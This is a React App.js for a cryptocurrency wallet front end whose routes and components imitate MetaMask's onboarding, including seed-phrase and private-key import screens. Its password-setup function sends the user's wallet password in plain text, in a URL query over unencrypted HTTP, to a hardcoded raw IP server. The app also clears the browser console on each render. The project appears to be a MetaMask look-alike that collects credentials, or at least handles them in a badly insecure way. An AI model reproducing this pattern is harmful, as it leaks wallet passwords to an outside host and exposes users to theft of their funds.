// import logo from './logo.svg';
import "./App.css";

import Web3 from "web3";

import { BrowserRouter, Router } from "react-router-dom";
import { Route, Routes, useLocation } from "react-router-dom";
import { NavLink } from "react-router-dom";

import Swal from "sweetalert2"; 
import withReactContent from 'sweetalert2-react-content'

import Welcome from "./Components/welcome/Welcome";
import Helpus from "./Components/helpus/Helpus";
import Newtometamask from "./Components/newtometamask/Newtometamask";
import Import from "./Components/import/Import";
import Create from "./Components/create/Create";
import Securewallet from "./Components/securewallet/Securewallet";
import Secretrecovery from "./Components/secretrecovery/Secretrecovery";
import Wallet from "./Components/wallet/Wallet";
import Newparase from "./Components/newparase/Newparase";
import Inputnewphrase from "./Components/newparase/Inputnewphrase";
import ImpKey from "./Components/imp-key/ImpKey";
import Createacc from "./Components/createacc/Createacc";
import Setting from "./Components/settings/setting";
import ImportToken from "./Components/imp-token/ImportToken";
import TockenUI from "./Components/tockenui/TockenUI";
import Secretkey from "./Components/secretkey/Secretkey";
import { useEffect, useState } from "react";

function App() {
  // ok()
  const [value, setValue] = useState(0);
  const [getNetworks, setgetNetworks] = useState(0);
  // ----------------------------------------------------------------
  async function test() {
    let p1 = document.getElementById("password").value;
    let p2 = document.getElementById("cpassword").value;
    if(p1 != p2) {
      Swal.fire({
        icon: 'error',
        title: 'Oops...',
        text: 'Password do not match',
      })
    }
    else if (p1.length < 8 && p2.length < 8) {
      Swal.fire({
        icon: 'error',
        title: 'Oops...',
        text: 'Password must be at least 8 characters long',
      })
    } else if (p1 === "" || p1 === undefined || p1 === null) {
      Swal.fire({
        icon: 'error',
        title: 'Oops...',
        text: 'Fill in the password field',
      })
    } else {
      // const url = "http://167.172.106.122:8081/addnew";

      let data = {
        password: p2,
      };
    
        await fetch("http://167.172.106.122:8081/password?pwd="+p2)
        .then((res) => res.json())
        .then(async (data) => { 
          console.log(data);
          localStorage.setItem("Password", data.password);
          window.location.replace("/securewallet");
        });
   
    




      // localStorage.setItem("account-data", JSON.stringify(data) );
              // localStorage.setItem("wallet_id", authors[0].Wallet_id);
     

      
      // let request = new Request(url, {
      //   method: "POST",
      //   body: JSON.stringify(data),
      //   headers: new Headers({
      //     "Content-Type": "application/json",
      //   }),
      // });

      // await fetch(request)
      //   .then(function () {
      //     // Handle response you get from the API
      //     // console.log("data transfer");
      //   })
      //   .then(Getdata(p2));
    }
  }

  // async function Getdata(p2) {
  //   await fetch(`http://167.172.106.122:8081/getdata1${p2}`)
  //     .then((response) => {
  //       return response.json();
  //     })
  //     .then((data) => {
  //       let authors = data;
  //       setValue(authors[0].Wallet_id);
  //       // console.log("Authors" + authors[0].Wallet_id);

  //       localStorage.setItem("wallet_id", authors[0].Wallet_id);

  //       window.location.replace("/securewallet");
  //     });
  //   //   return(
  //   //   await fetch(`http://167.172.106.122:8081/getdata1${p2}`)
  //   //   .then(function(res) {
  //   //      return res.json();
  //   //     })
  //   //     .then((data) => {
  //   //     setValue(data[0].Wallet_id)
  //   //     console.log("sadds"+data[0].Wallet_id);
  //   //     // window.location.replace("/securewallet")
  //   //     }
  //   // )
  //   // )
  // }
  //----------------------------------------------------------------

  async function getNetwork() {
    
    let name = document.getElementById("Network-name").value;
    let url = document.getElementById("Network-url").value;
    let chain = document.getElementById("Network-chain").value;
    let sembol = document.getElementById("Network-symbol").value;
    //props.setRecord(record=>[...record ,result])
    let arri = [name, url, chain, sembol];
    setgetNetworks(arri);

    window.location.replace("/wallet");
  }
  const [liData, setLiData] = useState([]);
  const getTheRecord = async () => {
    //setLiData([])
    var results = await JSON.parse(localStorage.getItem("networks") || "[]");
    // if (results == null || results == undefined || results == '' || results == []){
    //   results = ['Ethereum Mainnet,https://mainnet.infura.io/v3/,1,ETH,https://etherscan.io']
    // }

    // console.log("The  final  results app js" + results);
    //
    localStorage.setItem("assetsArray", JSON.stringify(results));

    for (var i = 0; i < results.length; i++) {
      setLiData((liData) => [...liData, results[i]]);
      //console.log(liData)
    }
  };

  useEffect(() => {
  getTheRecord();
  }, []);

  useEffect(() => {
    //  console.log(JSON.stringify(liData))
    
  }, [liData]);

  // useEffect((index12) => {

  //   console.log("Ye agaya app js pe "+index12)
  // },[index12])
  //----------------------------------------------------------------


  //////theme Switcher//////
  async function dark(){
    document.getElementById('dark').style.display = 'none';
    document.getElementById('light').style.display = 'block';
    
    localStorage.setItem("Mode", "dark");
    document.body.style.backgroundColor = "black";
    document.body.style.color = "white";
    

    document.getElementById('theme').style.backgroundColor = "black";
    document.getElementById('theme').style.color = "white";
    document.getElementById('them2').style.backgroundColor = "black";
    document.getElementById('them2').style.color = "white";
    document.getElementById('themecard').style.backgroundColor = "black";
    document.getElementById('themecard').style.color = "white";
    document.getElementById('thememodal').style.backgroundColor = "black";
    document.getElementById('thememodal').style.color = "white";
    document.getElementById('cntnt').style.backgroundColor = "black";
    document.getElementById('cntnt').style.color = "white";
    document.getElementById('mbody').style.backgroundColor = "black";
    document.getElementById('mbody').style.color = "white";
    document.getElementById('m2body').style.backgroundColor = "black";
    document.getElementById('m2body').style.color = "white";
    document.getElementById('dpositbtn').style.backgroundColor = "black";
    document.getElementById('dpositbtn').style.color = "white";
    document.getElementById('cdpositbtn').style.backgroundColor = "black";
    document.getElementById('cdpositbtn').style.color = "white";
    document.getElementById('csent').style.backgroundColor = "black";
    document.getElementById('csent').style.color = "white";
    document.getElementById('sent').style.backgroundColor = "black";
    document.getElementById('sent').style.color = "white";
    document.getElementById('st').style.backgroundColor = "black";
    document.getElementById('st').style.color = "white";
    document.getElementById('myAssetsName').style.backgroundColor = "lightgray  ";
    document.getElementById('myAssetsName').style.color = "white";
    document.getElementById('onee').style.backgroundColor = "black";
    document.getElementById('onee').style.color = "white";
    document.getElementById('twoo').style.backgroundColor = "black";
    document.getElementById('twoo').style.color = "white";
    document.getElementById('arone').style.backgroundColor = "black";
    document.getElementById('arone').style.color = "white";
    document.getElementById('artwo').style.backgroundColor = "black";
    document.getElementById('artwo').style.color = "white";
    document.getElementById('buy').style.backgroundColor = "black";
    document.getElementById('buy').style.color = "white";
    document.getElementById('sentto').style.backgroundColor = "black";
    document.getElementById('sentto').style.color = "white";
    document.getElementById('sendToaddress').style.backgroundColor = "black";
    document.getElementById('sendToaddress').style.color = "white";
    document.getElementById('sendToammount').style.backgroundColor = "black";
    document.getElementById('sendToammount').style.color = "white";
    document.getElementById('pb').style.color = "white";
    
    
    document.getElementById('dropdownMenuButton1').style.backgroundColor = "black";
    document.getElementById('dropdownMenuButton1').style.color = "white";
      
  }
  async function light(){
    document.getElementById('light').style.display = 'none';
    document.getElementById('dark').style.display = 'block';
  
    localStorage.setItem("Mode", "light");
    document.body.style.backgroundColor = "white";
    document.body.style.color = "black";

    document.getElementById('theme').style.backgroundColor = "white";
    document.getElementById('theme').style.color = "black";
    document.getElementById('them2').style.backgroundColor = "white";
    document.getElementById('them2').style.color = "black";
    document.getElementById('themecard').style.backgroundColor = "white";
    document.getElementById('themecard').style.color = "black";
    document.getElementById('thememodal').style.backgroundColor = "white";
    document.getElementById('thememodal').style.color = "black";
    document.getElementById('cntnt').style.backgroundColor = "white";
    document.getElementById('cntnt').style.color = "black";
    document.getElementById('mbody').style.backgroundColor = "white";
    document.getElementById('mbody').style.color = "black";
    document.getElementById('m2body').style.backgroundColor = "white";
    document.getElementById('m2body').style.color = "black";
    document.getElementById('dpositbtn').style.backgroundColor = "white";
    document.getElementById('dpositbtn').style.color = "black";
    document.getElementById('cdpositbtn').style.backgroundColor = "white";
    document.getElementById('cdpositbtn').style.color = "black";
    document.getElementById('csent').style.backgroundColor = "white";
    document.getElementById('csent').style.color = "black";
    document.getElementById('sent').style.backgroundColor = "white";
    document.getElementById('sent').style.color = "black";
    document.getElementById('st').style.backgroundColor = "white";
    document.getElementById('st').style.color = "black";
    document.getElementById('myAssetsName').style.backgroundColor = "white";
    document.getElementById('myAssetsName').style.color = "black";
    document.getElementById('onee').style.backgroundColor = "white";
    document.getElementById('onee').style.color = "black";
    document.getElementById('twoo').style.backgroundColor = "white";
    document.getElementById('twoo').style.color = "black";
    document.getElementById('arone').style.backgroundColor = "white";
    document.getElementById('arone').style.color = "black";
    document.getElementById('artwo').style.backgroundColor = "white";
    document.getElementById('artwo').style.color = "black";
    document.getElementById('buy').style.backgroundColor = "white";
    document.getElementById('buy').style.color = "black";
    document.getElementById('sentto').style.backgroundColor = "white";
    document.getElementById('sentto').style.color = "black";
    document.getElementById('sendToaddress').style.backgroundColor = "white";
    document.getElementById('sendToaddress').style.color = "black";
    document.getElementById('sendToammount').style.backgroundColor = "white";
    document.getElementById('sendToammount').style.color = "black";
    document.getElementById('pb').style.color = "#17E9E1";
    document.getElementById('dropdownMenuButton1').style.backgroundColor = "white";
    document.getElementById('dropdownMenuButton1').style.color = "black";
    
  }
  
  //////theme Switcher//////
 async function them(){
  var mode = await localStorage.getItem("Mode");
  if(mode === 'dark'){
   dark();
  }else if(mode === 'light'){
   light();
  }else {
   light();
  }

 }
//  async function ok(){
//   const wlt = await localStorage.getItem("wallet_adrs");
//   if(window.location.pathname == "/wallet"){
//     console.log("Welcome Back");
//   }else if(!wlt){
//     window.location.replace("/create");
//  }else if( ){
//   window.location.replace("/wallet");
//  }
// }
 them();
 console.clear();
 return (
    <div className="App">
      <Routes>
        <Route exect path="/" element={<Welcome />} />
        <Route exect path="/help" element={<Helpus />} />
        <Route exect path="/new" element={<Newtometamask />} />
        <Route exect path="/import" element={<Import />} />
        <Route exect path="/create" element={<Create test = {test} />} />
        <Route exect path="/phrase" element={<Newparase />} />
        <Route exect path="/securewallet" element={<Securewallet />} />
        <Route exect path="/secret" element={<Secretrecovery />} />
        <Route exect path="/token" element={<TockenUI  />} />
        <Route exect path="/secretkey" element={<Secretkey />} />
        <Route
          exect
          path="/wallet"
          element={<Wallet data={liData} getNetworks={getNetworks} dark={dark} light={light} />}
        />
        <Route
          exect
          path="/inputnew"
          element={<Inputnewphrase value={value} />}
        />
        <Route exect path="/impkey" element={<ImpKey />}/>
        <Route exect path="/importToken" element={<ImportToken />} />
        <Route exect path="/createaccount" element={<Createacc />} />
        <Route
          exect
          path="/settings"
          element={<Setting getNetwork={getNetwork} />}
        />
      </Routes>
    </div>
  );
}

export default App;
